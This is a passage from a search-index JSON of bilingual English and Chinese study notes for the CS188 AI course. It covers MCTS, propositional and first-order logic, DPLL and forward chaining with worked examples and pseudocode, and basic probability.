above algorithms all the way to the level of terminal nodes in the game tree under consideration, and so we introduced the notion of evaluation functions for early termination. </li> <li>For problems with large branching factors we described the MCTS and UCT algorithms. Such algorithms are easily parallelizable, allowing for a large number of rollouts to take place using modern hardware.</li> <li>We considered the problem of general games with multi-agent, where the rules are not necessarily zero-sum.</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/06-Expectimax_Monte_Carlo_Tree_Search/#link","title":"link","text":"<ul> <li>cs188-sp24-note06</li> </ul> <ol> <li> <p>In the below formulation, p(s\u2032 |s) refers to either the probability that a given nondeterministic action results in moving from state s to s\u2032 , or the probability that an opponent chooses an action that results in moving from state s to s\u2032 , depending on the specifics of the game and the game tree under consideration.\u00a0\u21a9</p> </li> <li> <p>the value of the state \u8d8a\u5927\uff0c\u5728\u8be5\u51b3\u7b56\u4e0b\u7684\u6a21\u62df\u80dc\u5229\u53ef\u80fd\u6027\uff08\u5373\u4e0b\u56fe\u4e2d\u7684 x/y\uff09\u4e5f\u5c31\u8d8a\u5927\u3002\u00a0\u21a9</p> </li> <li> <p>where N(n) denotes the total number of rollouts from node n and U(n) the total number of wins for Player(Parent(n)).\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/07-Propositional_Logic_and_Planning/","title":"07 Propositional Logic and Planning","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/07-Propositional_Logic_and_Planning/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/07-Propositional_Logic_and_Planning/#a-knowledge-based-agent","title":"A Knowledge Based Agent","text":"<p>Imagine a dangerous world filled with lava, the only respite a far away oasis. We would like our agent to be able to safely navigate from its current position to the oasis.</p> <p>In reinforcement learning, we assume that the only guidance we can give is a reward function which will try to nudge the agent in the right direction, like a game of \u2019hot or cold\u2019. </p> <p>However, we might consider an alternative strategy, instead.</p> <p>Let\u2019s tell the agent some facts about the world and allow it to reason about what to do based on the information at hand.</p> <p>This alternative type of agent is known as a knowledge based agent. Such an agent maintains a knowledge base, which is a collection of logical sentences that encodes what we have told the agent and what it has observed . The agent is also able to perform logical inference to draw new conclusions.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/07-Propositional_Logic_and_Planning/#the-language-of-logic","title":"The Language of Logic","text":"<p>\u5728cs70 \u4e2d\u6211\u4eec\u5df2\u7ecf\u5b66\u4e60\u4e86\u89e3\u8fc7\u4e86\uff0c\u8fd9\u91cc\u7b80\u5355\u56de\u987e\u4e00\u4e0b\u3002</p> <ol> <li>Conjunction\uff08\u5408\u53d6\uff09: P\u2227Q (\u201cP and Q\u201d). True only when both P and Q are true.  <ul> <li>conjunctive normal form or CNF<sup>1</sup></li> </ul> </li> <li>Disjunction\uff08\u6790\u53d6\uff09: P\u2228Q (\u201cP or Q\u201d). True when at least one of P and Q is true.</li> <li>Negation\uff08\u53d6\u53cd\u00a0/\u00a0\u5426\uff09: \u00acP (\u201cnot P\u201d). True when P is false.</li> <li>Implication\uff08\u8574\u6db5\u8bcd\uff09: P \u21d2 Q (\u201cP implies Q\u201d). This is the same as \u201cIf P, then Q.\u201d</li> <li>two-way implication or biconditional :\u00a0p\u2194q.</li> <li>quantifiers\uff08\u91cf\u8bcd\uff09: The universal quantifier \u2200 (\u201cfor all\u201d) and the existential quantifier \u2203 (\u201cthere exists\u201d).</li> </ol> <p></p> <p></p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/07-Propositional_Logic_and_Planning/#link","title":"link","text":"<ul> <li>cs188-sp24-note07</li> </ul> <ol> <li> <p>CNF is a conjunction of clauses, each of which a disjunction of literals. It has the general form (P1 \u2228 \u00b7\u00b7\u00b7 \u2228Pi)\u2227 \u00b7\u00b7\u00b7 \u2227 (Pj \u2228\u00b7\u00b7\u00b7 \u2228Pn), i.e. it is an \u2018AND\u2019 of \u2018OR\u2019s.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/","title":"08 DPLL&ForwardChaining","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#model-checking","title":"Model Checking","text":"<p>The inference problem can be formulated as figuring out whether KB \u22a8 q, where KB is our knowledge base of logical sentences, and q is some query.</p> <p>One simple algorithm for checking whether KB \u22a8 q is to enumerate all possible models<sup>1</sup>, and to check if in all the ones in which KB is true, q is true as well (using truth table). This approach is known as model checking.</p> <p>For a propositional logical system, if there are N symbols, there are \\(2^N\\) models to check, and hence the time complexity of this algorithm is \\(O(2^N)\\), while in first-order logic<sup>2</sup>, the number of models is infinite. </p> <p>Info</p> <p>In fact the problem of propositional entailment is known to be co-NP-complete. While the worst case runtime will inevitably be an exponential function of the size of the problem, there are algorithms that can in practice terminate much more quickly. We will discuss two model checking algorithms for propositional logic.</p> <p>The first, proposed by Davis, Putnam, Logemann, and Loveland (which we will call the DPLL algorithm) is essentially a depth-first, backtracking search over possible models with three tricks to reduce excessive backtracking. This algorithm aims to solve the satisfiability problem, i.e. given a sentence, find a working assignment to all the symbols. </p> <p>As we mentioned, the problem of entailment can be reduced to one of satisfiability<sup>3</sup> (show that A\u2227 \u00acB is not satisfiable), and specifically DPLL takes in a problem in CNF . Satisfiability can be formulated as a constraint satisfaction problem as follows: let the variables (nodes) be the symbols and the constraints be the logical constraints imposed by the CNF. Then DPLL will continue assigning symbols truth values until either a satisfying model is found or a symbol cannot be assigned without violating a logical constraint, at which point the algorithm will backtrack to the last working assignment</p> <p>However, DPLL makes three improvements over simple backtracking search:</p> <ol> <li>Early Termination: A clause is true if any of the symbols are true. Also, a sentence is false if any single clause is false.</li> <li>Pure Symbol Heuristic: A pure symbol is a symbol that only shows up in its positive form (or only in its negative form) throughout the entire sentence. Pure symbols can immediately be assigned true or false.<sup>4</sup></li> <li>Unit Clause Heuristic: A unit clause is a clause with just one literal or a disjunction with one literal and many falses. In a unit clause, we can immediately assign a value to the literal, since there is only one valid assignment.<sup>5</sup></li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#dpll-example","title":"DPLL: Example","text":"<p>Suppose we have the following sentence in conjunctive normal form (CNF), We want to use the DPLL algorithm to determine whether it is satisfiable.</p> <p><code>(\u00acN \u2228 \u00acS)\u2227(M \u2228Q\u2228N)\u2227(L\u2228 \u00acM)\u2227(L\u2228 \u00acQ)\u2227(\u00acL\u2228 \u00acP)\u2227(R\u2228P\u2228N)\u2227(\u00acR\u2228 \u00acL)\u2227(S)</code></p> <p>Suppose we use a fixed variable ordering (alphabetical order) and a fixed value ordering (true before false).</p> <p>On each recursive call to the DPLL function, we keep track of three things:</p> <ul> <li>model is a list of the symbols we\u2019ve assigned so far, and their values.<sup>6</sup></li> <li>symbols is a list of unassigned symbols that still need assignments.</li> <li>clauses is a list of clauses (disjunctions) in CNF that still need to be considered on this call or future recursive calls to DPLL.</li> </ul> <p>We start by calling DPLL with an empty model (no symbols assigned yet), symbols containing all the symbols in the original sentence, and clauses containing all the clauses in the original sentence.</p> pseudocode1 for DPLL<pre><code>function DPLL-SATISFIABLE?(s) returns true or false  \ninputs: s, a sentence in propositional logic  \n    # \u5c06\u8f93\u5165\u7684\u547d\u9898\u903b\u8f91\u53e5\u5b50\u8f6c\u6362\u4e3a CNF \u5f62\u5f0f\u7684\u5b50\u53e5\u96c6\u5408  \n    clauses \u2190 the set of clauses in the CNF representation of s  \n    # \u83b7\u53d6\u6240\u6709\u7684\u547d\u9898\u7b26\u53f7  \n    symbols \u2190 a list of the proposition symbols in s  \n     # \u8c03\u7528 DPLL \u7b97\u6cd5\u8fdb\u884c\u6c42\u89e3  \n    return DPLL(clauses, symbols, {})\n</code></pre> <p>Example</p> <ul> <li>model: {}</li> <li>symbols: [L,M,N,P,Q,R,S]</li> <li>clauses: (\u00acN\u2228\u00acS)\u2227(M\u2228Q\u2228N)\u2227(L\u2228\u00acM)\u2227(L\u2228\u00acQ)\u2227(\u00acL\u2228\u00acP)\u2227(R\u2228P\u2228N)\u2227(\u00acR\u2228\u00acL)\u2227(S)</li> </ul> <p>Then comes the real DPLL:</p> pseudocode2 for DPLL<pre><code>function DPLL(clauses, symbols, model) returns true or false  \n    # Early Termination ?\n    if every clause in clauses is true in model then  \n        return true  # \u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u89e3   \n    if some clause in clauses is false in model then  \n        return false # \u5f53\u524d\u6a21\u578b\u65e0\u6cd5\u6ee1\u8db3\u6240\u6709\u5b50\u53e5  \n\n    # Pure Symbol Heuristic\uff1a\u67e5\u627e\u5728\u5f53\u524d\u5b50\u53e5\u4e2d\u53ea\u51fa\u73b0\u4e00\u6b21\u7684\u7b26\u53f7  \n    P, value \u2190 FIND-PURE-SYMBOL(symbols, clauses, model)  \n    if P is non-null then  \n        # \u5982\u679c\u627e\u5230\uff0c\u5219\u5c06\u5176\u8d4b\u503c\u5e76\u7ee7\u7eed\u9012\u5f52  \n        return DPLL(clauses, symbols - P, model \u222a {P = value})  \n\n    # Unit Clause Heuristic\uff1a\u67e5\u627e\u5f53\u524d\u6a21\u578b\u4e2d\u53ea\u5305\u542b\u4e00\u4e2a\u672a\u8d4b\u503c\u7b26\u53f7\u7684\u5b50\u53e5  \n    P, value \u2190 FIND-UNIT-CLAUSE(clauses, model)  \n    if P is non-null then  \n        # \u5982\u679c\u627e\u5230\u5355\u5b50\u53e5\uff0c\u5219\u5c06\u5176\u8d4b\u503c\u5e76\u7ee7\u7eed\u9012\u5f52  \n        return DPLL(clauses, symbols - P, model \u222a {P = value})  \n\n    # \u5206\u652f\uff1a\u9009\u62e9\u4e00\u4e2a\u7b26\u53f7\u8fdb\u884c\u8d4b\u503c  \n    P \u2190 FIRST(symbols); rest \u2190 REST(symbols)  \n    # \u5c1d\u8bd5\u5c06 P \u8d4b\u503c\u4e3a true\uff0c\u7136\u540e\u4e3a false  \n    return DPLL(clauses, rest, model \u222a {P = true}) or  \n           DPLL(clauses, rest, model \u222a {P = false})\n</code></pre> <p>First, we apply early termination: we check if given the current model, every clause is true, or at least one clause is false. Since the model hasn\u2019t assigned any symbol yet, we don\u2019t know which clauses are true or false yet. </p> <p>Next, we check for pure literals. There are no symbols that only appear in a non-negated form, or symbols that only appear in a negated form, so there are no pure literals that we can simplify. For example, N is not a pure literal because the first clause uses the negated \u00acN, and the second clause uses the non-negated N. </p> <p>Next, we check for unit clauses (clauses with just one symbol). There\u2019s one unit clause S. For this overall sentence to be true, we know that S has to be true (there\u2019s no other way to satisfy that clause). Therefore, we can make another call to DPLL with S assigned to true in our model, and S removed from the list of symbols that still need assignments.</p> <p>Our second DPLL call looks like this:</p> <p>Info</p> <ul> <li>model: {S : T}</li> <li>symbols: [L,M,N,P,Q,R]</li> <li>clauses: (take S=T in) (\u00acN)\u2227(M\u2228Q\u2228N)\u2227(L\u2228\u00acM)\u2227(L\u2228\u00acQ)\u2227(\u00acL\u2228\u00acP)\u2227(R\u2228P\u2228N)\u2227(\u00acR\u2228 \u00acL)</li> </ul> <p>Then DPLL again, but when we check for unit clauses, there\u2019s one unit clause (\u00acN). For this overall sentence to be true, (\u00acN) must be true, so N must be false.</p> <p>Info</p> <ul> <li>model: {S : T,N : F}</li> <li>symbols: [L,M,P,Q,R]</li> <li>clauses:(take model in) (M\u2228Q)\u2227(L\u2228\u00acM)\u2227(L\u2228\u00acQ)\u2227(\u00acL\u2228\u00acP)\u2227(R\u2228P)\u2227(\u00acR\u2228\u00acL)</li> </ul> <p>Go on, we pass three tricks and need to try to assign a value to a variable. From our fixed variable ordering, we\u2019ll assign M first, and from our fixed value ordering, we\u2019ll try making M true first<sup>7</sup>.</p> <p>Info</p> <ul> <li>model: {S : T,N : F,M : T}</li> <li>symbols: [L,P,Q,R]</li> <li>clauses:(take model in) (L)\u2227(L\u2228 \u00acQ)\u2227(\u00acL\u2228 \u00acP)\u2227(R\u2228P)\u2227(\u00acR\u2228 \u00acL)</li> </ul> <p>...</p> <p>Finally, we get:</p> <p>Info</p> <ul> <li>model: {S : T,N : F,M : F,Q : T,L : T,P : F}</li> <li>symbols: [R]</li> <li>clauses:(take model in) (R)\u2227(\u00acR)\u2261F</li> </ul> <p>Obviously, the s is False if M is True. After the same operation, we found that the s is False even if M is False. Then we can conclude that this entire sentence is unsatisfiable, and we\u2019re done.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#theorem-proving","title":"Theorem Proving","text":"<p>We could also prove entailment using three rules of inference:</p> <ol> <li>If our knowledge base contains A and A \u21d2 B we can infer B (Modus Ponens).</li> <li>If our knowledge base contains A\u2227B we can infer A. We can also infer B. (And-Elimination).</li> <li>If our knowledge base contains A and B we can infer A\u2227B (Resolution).</li> </ol> resolution algorithm <p>The last rule forms the basis of the resolution algorithm which iteratively applies it to the knowledge base and to the newly inferred sentences until either q is inferred, in which case we have shown that KB \u22a8 q, or there is nothing left to infer, in which case \\(KB \\not\\models q\\). </p> <p>Although this algorithm is both sound (the answer will be correct) and complete (the answer will be found) it runs in worst case time  that is exponential in the size of the knowledge base<sup>8</sup>.</p> <p>However, in the special case that our knowledge base only has literals (symbols by themselves) and implications: (P1\u2227\u00b7\u00b7\u00b7\u2227Pn \u21d2 Q) \u2261 (\u00acP1\u2228\u00b7\u00b7\u00b7\u2228\u00acP2\u2228Q), we can prove entailment in time linear to the size of the knowledge base . </p> <p>One algorithm, forward chaining iterates through every implication statement in which the premise (left hand side) is known to be true, adding the conclusion (right hand side) to the list of known facts. This is repeated until q is added to the list of known facts, or nothing more can be inferred.</p> pseudocode for PL-FC-Entails<pre><code>function PL-FC-ENTAILS?(KB, q) returns true or false  \n    inputs:  KB, q\n\ncount \u2190 table, where count[c] is the number of symbols in c\u2019s premise  \ninferred \u2190 table, where inferred[s] is initially false for all symbols  \nagenda \u2190 a queue of symbols, initially symbols known to be true in KB  \n\nwhile agenda is not empty do  \n    p \u2190 Pop(agenda)  # \u4ece agenda \u4e2d\u53d6\u51fa\u4e00\u4e2a\u7b26\u53f7 p  \n    if p = q then return true  # \u5982\u679c p \u662f\u67e5\u8be2 q\uff0c\u8fd4\u56de true  \n    if inferred[p] = false then  # \u5982\u679c p \u5c1a\u672a\u88ab\u63a8\u65ad  \n        inferred[p] \u2190 true  # \u6807\u8bb0 p \u4e3a\u5df2\u63a8\u65ad  \n        for each clause c in KB where p is in c.Premise do  \n            decrement count[c]  # \u5bf9\u6bcf\u4e2a\u5305\u542b p \u7684\u5b50\u53e5 c\uff0c\u51cf\u5c11\u5176\u524d\u63d0\u7b26\u53f7\u8ba1\u6570  \n            if count[c] = 0 then  # \u5982\u679c c \u7684\u6240\u6709\u524d\u63d0\u7b26\u53f7\u90fd\u5df2\u88ab\u63a8\u65ad  \n                add c.Conclusion to agenda  # \u5c06 c \u7684\u7ed3\u8bba\u6dfb\u52a0\u5230 agenda  \nreturn false  # \u5982\u679c agenda \u5904\u7406\u5b8c\u6bd5\u4ecd\u672a\u627e\u5230 q\uff0c\u8fd4\u56de false\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#forward-chaining-example","title":"Forward Chaining: Example","text":"<p>Suppose we had the following knowledge base, We\u2019d like to use forward chaining to determine if Q is true or false:</p> <p>Example</p> <ol> <li>A \u2192 B</li> <li>A \u2192 C</li> <li>B\u2227C \u2192 D</li> <li>D\u2227E \u2192 Q</li> <li>A\u2227D \u2192 Q</li> <li>A</li> </ol> <p>To initialize the algorithm, we\u2019ll initialize a list of numbers count. The ith number in the list tells us how many symbols are in the premise of the ith clause<sup>9</sup>. </p> <p>Then, we\u2019ll initialize inferred, a mapping of each symbol to true/false. This tells us which symbols we\u2019ve found to be true. Initially, all symbols will be false, because we haven\u2019t proven any symbols to be true yet. </p> <p>Finally, we\u2019ll initialize a list of symbols agenda, which is a list of symbols that we can prove to be true, but have not propagated the effects of yet<sup>10</sup>. Initially, agenda will only contain the symbols we directly know to be true, which is just A here. (In other words, agenda starts with any clauses with 0 symbols in its premise.)</p> <p>Info</p> <ul> <li>count: [1,1,2,2,2,0]</li> <li>inferred: {A : F,B : F,C : F,D : F,E : F,Q : F}</li> <li>agenda: [A]</li> </ul> <p>On each iteration, we\u2019ll pop an element off agenda. Here, there\u2019s only one element that we can pop off: A. The symbol we popped off is not the symbol we want to analyze (Q), so we\u2019re not done with the algorithm yet. </p> <p>According to the inferred table, A is false. However, since we\u2019ve just popped A off the agenda, we\u2019re able to set it to true. </p> <p>Next, we need to propagate the consequences of A being true. For each clause where A is in the premise, we\u2019ll decrement its corresponding count to indicate that there is one fewer symbol in the premise that needs to be checked. In this example, clauses 1, 2, and 5 contain A in the premise, so we\u2019ll decrement elements 1, 2, and 5 in count. </p> <p>Finally, we check if any clauses have reached a count of 0, and add the conclusions of them to the agenda.</p> <p>Info</p> <ul> <li>count: [0,0,2,2,1,0]</li> <li>inferred: {A : T,B : F,C : F,D : F,E : F,Q : F}</li> <li>agenda: [B,C]</li> </ul> <p>Finally, we get:</p> <p>Info</p> <ul> <li>count: [0,0,0,1,0,0]</li> <li>inferred: {A : T,B : T,C : T,D : T,E : F,Q : F}</li> <li>agenda: [Q]</li> </ul> <p>Next, we\u2019ll pop off Q from the agenda. This is the symbol we wanted to evaluate, and popping it off the agenda indicates that it has been proven to be true. We conclude that Q is true and finish the algorithm.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/08-DPLL%26ForwardChaining/#link","title":"link","text":"<ul> <li>cs188-sp24-note08</li> </ul> <ol> <li> <p>model \u53ef\u4ee5\u7406\u89e3\u4e3a\u5bf9\u539f\u5b50\u547d\u9898\u7684\u771f\u5047\u6027\u8fdb\u884c\u5047\u5b9a\uff1b\u4f8b\u5982 A\u2228\u00acB\uff0c\u90a3\u4e48 {A:T, B:F} \u5c31\u662f\u4e00\u4e2a model\uff0c\u6b64\u65f6\u7684 q \u4e5f\u786e\u5b9e\u4e3a true\u3002\u00a0\u21a9</p> </li> <li> <p>First-order logic \u2014also called\u00a0predicate logic,\u00a0predicate calculus,\u00a0quantificational logic. Propositional Logic \u5904\u7406\u7b80\u5355\u547d\u9898\u53ca\u5176\u8fde\u63a5\uff1b\u800c Predicate Logic \u5904\u7406\u5e26\u6709\u91cf\u8bcd\u548c\u53d8\u91cf\u7684\u547d\u9898\uff0c\u90a3\u4e48\u9700\u8981\u8003\u8651\u7684\u60c5\u51b5\u53d8\u5f97\u65e0\u6bd4\u5730\u591a\uff1b\u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u7bc7\u7b14\u8bb0\u8be6\u89e3\u8bb2\u89e3\u3002\u00a0\u21a9</p> </li> <li> <p>Entailment to Satisfiability: To check if ( A ) entails ( B ) (written as ( \\(A \\models B\\) )), you can instead check if ( \\(A \\land \\neg B\\) ) is unsatisfiable. If ( \\(A \\land \\neg B\\) ) cannot be true, then ( \\(A \\models B\\) ) is true.\u00a0\u21a9</p> </li> <li> <p>For example, in the sentence (A\u2228B)\u2227(\u00acB\u2228C)\u2227(\u00acC\u2228A), we can identify A as the only pure symbol and can immediately A assign to true, reducing the satisfying problem to one of just finding a satisfying assignment of (\u00acB\u2228C).\u00a0\u21a9</p> </li> <li> <p>For example, B must be true for the unit clause (B\u2228 false\u2228 \u00b7\u00b7\u00b7 \u2228 false) to be true.\u00a0\u21a9</p> </li> <li> <p>For example, {A:T, B:F} tells us the values of two symbols assigned so far.\u00a0\u21a9</p> </li> <li> <p>Remember that we use a fixed variable ordering (alphabetical order) and a fixed value ordering (true before false).\u00a0\u21a9</p> </li> <li> <p>\u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u60f3\u5728 MC\uff08\u5e94\u8be5\u6ca1\u4eba\u4e0d\u77e5\u9053\u8fd9\u662f\u5565\u5427\uff09\u5236\u4f5c\u4e00\u4e2a\u86cb\u7cd5\uff1b\u4f5c\u4e3a\u4e00\u4e2a\u840c\u65b0\uff0c\u6211\u4e0d\u77e5\u9053\u5408\u6210\u9014\u5f84\uff0c\u4e5f\u4e0d\u77e5\u9053\u5728\u5de5\u4f5c\u53f0\u4e0a\u6211\u8be5\u5982\u4f55\u6446\u653e\uff0c\u751a\u81f3\u4e0d\u77e5\u9053\u6211\u5f53\u524d\u7684\u7248\u672c\u80fd\u5426\u5408\u6210\u86cb\u7cd5\u2026\u2026\u6211\u53ef\u4ee5\u5c06\u6240\u6709\u65b9\u5757\u4efb\u610f\u7ec4\u5408/\u6446\u653e\u6765\u5c1d\u8bd5\u5408\u6210\uff0c\u4f46\u662f\u8fd9\u6837\u9700\u8981\u5c1d\u8bd5\u7684\u6b21\u6570\u662f\u5f88\u591a\u7684\uff0c\u8fdc\u6bd4 MC \u4e2d\u7684\u65b9\u5757\u79cd\u7c7b\u591a\u3002\u00a0\u21a9</p> </li> <li> <p>For example, the third clause B\u2227C \u2192 D has 2 symbols (B and C) in its premise, so the third number in our list should be 2. Note that the sixth clause A has 0 symbols in its premise, because it is equivalent to True \u2192 A.\u00a0\u21a9</p> </li> <li> <p>For example, if D were in the agenda, this would indicate that we\u2019re ready to prove that D is true, but we still need to check how that affects any of the other clauses.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/","title":"09 First Order Logic","text":"<p>Prerequisite</p> <ul> <li>cs70-Propositional_Logic</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/#first-order-logic","title":"First-Order Logic","text":"<p>The second dialect of logic, first-order logic (FOL), is more expressive than propositional logic and uses objects as its basic components. With first-order logic we can describe relationships between objects and apply functions to them. Each object is represented by a constant symbol, each relationship by a predicate symbol, and each function by a function symbol. </p> <p>Note</p> <ul> <li>Terms in first-order logic are logical expressions that refer to an object. The simplest form of terms are constant symbols. However we don\u2019t want to define distinct constant symbols for every possible object.<sup>1</sup></li> <li>Atomic sentences in first-order logic are descriptions of relationships between objects, and are true if the relationship holds.<sup>2</sup></li> <li>Complex sentences of first order logic are analogous to those in propositional logic and are atomic sentences connected by logical connectives.</li> <li>Quantifiers: The universal quantifier \u2200, has the meaning \u201cfor all,\u201d and the existential quantifier \u2203,, has the meaning \u201cthere exists.\u201d</li> <li>Equality symbol: signify that two symbols refer to the same object.<sup>3</sup></li> </ul> <p>With propositional logic, we model our world as a set of symbols that are true or false. Under this assumption, we can represent a possible world as a vector, with a 1 or 0 for every symbol.</p> <ul> <li>This binary view of the world is what is known as a factored representation. With first-order logic, our world consists of objects that relate to one another. </li> <li>This second object-oriented view of the world is known as a structured representation, is in many ways more expressive and is more closely aligned with the language we naturally use to speak about the world.</li> </ul> <p>The following table summarizes the first order logic syntax:</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/#first-order-logical-inference","title":"First Order Logical Inference","text":"<p>With first order logic we formulate inference exactly the same way. We\u2019d like to find out if KB \u22a8 q, that is if q is true in all models under which KB is true. One approach to finding a solution is propositionalization or translating the problem into propositional logic so that it can be solved with techniques we have already laid out.</p> <p>Each universal (existential) quantifier sentence can be converted to a conjunction (disjunction) of sentences with a clause for each possible object that could be substituted in for the variable.  Then, we can use a SAT<sup>4</sup> solver, like DPLL or Walk-SAT, (un)satisfiability of (KB\u2227\u00acq). </p> <p>One problem with this approach is there are an infinite number of substitutions that we could make , since there is no limit to how many times we can apply a function to a symbol. For example, we can nest the function Classmate(\u00b7\u00b7\u00b7Classmate(Austen)\u00b7\u00b7\u00b7) as many times as we\u2019d like, until we reference the whole school.</p> <ul> <li>A theorem proved by Jacques Herbrand (1930) tells us that if a sentence is entailed by a knowledge base that there is a proof involving just a finite subset of the propositionalized knowledge base . Therefore, we can try iterating through finite subsets, specifically searching via iterative deepening through nested function applications<sup>5</sup>.</li> <li>Another approach is to directly do inference with first-order logic, also known as lifted inference<sup>6</sup>.This rule is known as Generalized Modus Ponens. The forward chaining algorithm for first order logic repeatedly applies generalized Modus Ponens and substitution to infer q or show that it cannot be inferred.</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/#logical-agents","title":"Logical Agents","text":"<p>Now that we understand how to formulate what we know and how to reason with it, we will talk about how to incorporate the power of deduction into our agents.</p> <p>One obvious ability an agent should have is the ability to figure out what state it is in, based on a history of observations and what it knows about the world (state-estimation).</p> <p>To incorporate its past observations into an estimate of where it currently is, an agent will need to have a notion of time and transitions between states . We call state attributes that vary with time fluents and write a fluent with an index for time , e.g. \\(Hot^t\\) = the air is hot at time t. </p> Successor-state axiom <p>\\(F^{t+1} \u21d4 ActionCausesF^t \u2228(F^t \u2227 \u00acActionCausesNotF^t )\\), and in our world, the transition could be formulated as \\(Hot^{t+1} \u21d4StepCloseToLava^t\u2228(Hot^t \u2227\u00acStepAwayFromLava^t)\\).</p> <p>Having written out the rules of the world in logic, we can now actually do planning by checking the satisfiability of some logic proposition!</p> <p>To do this, we construct a sentence that includes information about the initial state, the transitions (successor-state axioms), and the goal. (e.g. \\(InOasis^T\u2227Alive^T\\) encodes the objective of surviving and ending up in the oasis by time T). </p> <p>If the rules of the world have been properly formulated, then finding a satisfying assignment to all the variables will allow us to extract a sequence of actions that will carry the agent to the goal.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/09-First_Order_Logic/#link","title":"link","text":"<ul> <li>cs188-sp24-note09</li> </ul> <ol> <li> <p>For example, if we want to refer to John\u2019s left leg and Richard\u2019s left leg, we can do so by using function symbols like Leftleg(John) and Leftleg(Richard). Function symbols are just another way to name objects and are not actual functions.\u00a0\u21a9</p> </li> <li> <p>An example of an atomic sentence is Brother(John,Richard) which is formed by a predicate symbol followed by a list of terms inside the parentheses.\u00a0\u21a9</p> </li> <li> <p>For example, the incredible sentence \uff08\u4e0d\u61c2\u7684\u53ef\u4ee5\u81ea\u884c\u4e86\u89e3 Einstein\uff09(Wife(Einstein)=FirstCousin(Einstein)\u2227Wife(Einstein)=SecondCousin(Einstein)) is true.\u00a0\u21a9</p> </li> <li> <p>\"SAT\"\u662f\u5e03\u5c14\u53ef\u6ee1\u8db3\u6027\u95ee\u9898(Boolen Satisfiability Problem)\u7684\u7f29\u5199\u3002\u00a0\u21a9</p> </li> <li> <p>i.e. first search through substitutions with constant symbols, then substitutions with Classmate(Austen), then substitutions with Classmate(Classmate(Austen)), ...\u00a0\u21a9</p> </li> <li> <p>For example, we are given (\u2200x HasAbsolutePower(x)\u2227Person(x) \u21d2Corrupt(x))\u2227Person(John)\u2227HasAbsolutePower(John) (\"absolute power corrupts absolutely\"). We can infer Corrupt(John) by substituting x for John.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/10-Intro_to_Probability/","title":"10 Intro to Probability","text":"<p>Prerequisite</p> <ul> <li>CS70-13-Introduction_of_Discrete_Probability</li> <li>CS70-14-Conditional_Probability</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/10-Intro_to_Probability/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/10-Intro_to_Probability/#probability-rundown","title":"Probability Rundown","text":"<ul> <li>Probability</li> </ul> <p>A random variable represents an event whose outcome is unknown.  A probability distribution is an assignment of weights to outcomes, which must satisfies the following conditions: (1) 0 \\(\\leq P(\\omega)\\leq1\\)  (2)  \\(\\sum_\\omega P(\\omega)=1\\)</p> <ul> <li> <p>Conditional Probability \\(P(A|B)=\\sum_{\\omega\\in A\\cap B}P(\\omega|B=\\frac{P(A\\cap B)}{P(B)}=\\frac{P(B|A)P(A)}{P(B)}\\)</p> </li> <li> <p>Independent</p> <ul> <li>When A and B are mutually independent, P(A,B) = P(A)P(B), we write A\u2aebB. This is equivalent to B\u2aebA.</li> <li>If A and B are conditionally independent given C, then P(A,B|C) = P(A|C)P(B|C), we write A \u2aeb B|C. This is also equivalent to B\u2aebA|C.</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/10-Intro_to_Probability/#inference-by-enumeration-ibe","title":"Inference By Enumeration (IBE)","text":"<p>Given a joint PDF<sup>1</sup>, we can trivially compute any desired probability distribution P(\\(Q_1...Q_m|e_1...e_n\\)) using a simple and intuitive procedure known as inference by enumeration, for which we define three types of variables we will be dealing with:</p> <ol> <li>Query variables \\(Q_i\\) , which are unknown and appear on the left side of the conditional bar(|) in the desired probability distribution.</li> <li>Evidence variables \\(e_{i}\\) , which are observed variables whose values are known and appear on the right side of the conditional bar(|) in the desired probability distribution.</li> <li>Hidden variables, which are values present in the overall joint distribution but not in the desired distribution.</li> </ol> <p>In Inference By Enumeration, we follow the following algorithm:</p> <ol> <li>Collect all the rows consistent with the observed evidence variables.</li> <li>Sum out (marginalize) all the hidden variables.</li> <li>Normalize the table so that it is a probability distribution (i.e. values sum to 1)</li> </ol> <p>Example</p> <p></p> <p>If we wanted to compute P(W | S=winter) using the above joint distribution, we\u2019d select the four rows where S is winter, then sum out over T and normalize.</p> <p>Hence P(W=sun | S=winter) = 0.5 and P(W=rain | S=winter) = 0.5, and we learn that in winter there\u2019s a 50% chance of sun and a 50% chance of rain.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/10-Intro_to_Probability/#link","title":"link","text":"<ul> <li>cs188-sp24-note10</li> </ul> <ol> <li> <p>PDF\u6307\u7684\u662f\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff08Probability Density 